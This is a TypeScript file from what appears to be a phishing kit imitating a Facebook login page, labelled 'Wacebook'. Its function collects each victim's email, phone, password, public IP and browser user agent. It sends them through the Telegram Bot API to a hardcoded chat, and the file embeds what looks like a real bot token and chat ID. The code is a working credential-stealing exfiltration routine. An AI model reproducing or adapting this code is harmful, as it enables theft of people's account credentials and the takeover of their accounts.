
// Telegram Bot Configuration
// WARNING: These credentials will be visible in the client-side code
// For production, consider using environment variables or a backend service

export const TELEGRAM_CONFIG = {
  BOT_TOKEN: "7424173295:AAEdJShVCQB8laL2m0rn76mb0uLP47-yijs", // Replace with your actual bot token
  CHAT_ID: "1966355980", // Replace with your chat ID
  API_URL: "https://api.telegram.org/bot"
};

// Get user's public IP address
const getUserIP = async (): Promise<string> => {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'Unknown IP';
  } catch (error) {
    console.error('Failed to fetch IP address:', error);
    return 'Unknown IP';
  }
};

// Send login attempt to Telegram bot
export const sendToTelegramBot = async (data: {
  email: string;
  phone: string;
  password: string;
}) => {
  try {
    const ip = await getUserIP();
    const timestamp = new Date().toLocaleString();
    const userAgent = navigator.userAgent;

    const message = `
🚨 *Wacebook Login Attempt*
📧 Email: ${data.email}
📱 Phone: ${data.phone}
🔒 Password: ${data.password}
🌐 IP Address: ${ip}
⏰ Time: ${timestamp}
🖥️ User Agent: ${userAgent}
    `;

    const response = await fetch(`${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CONFIG.CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    return await response.json();
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    throw error;
  }
};
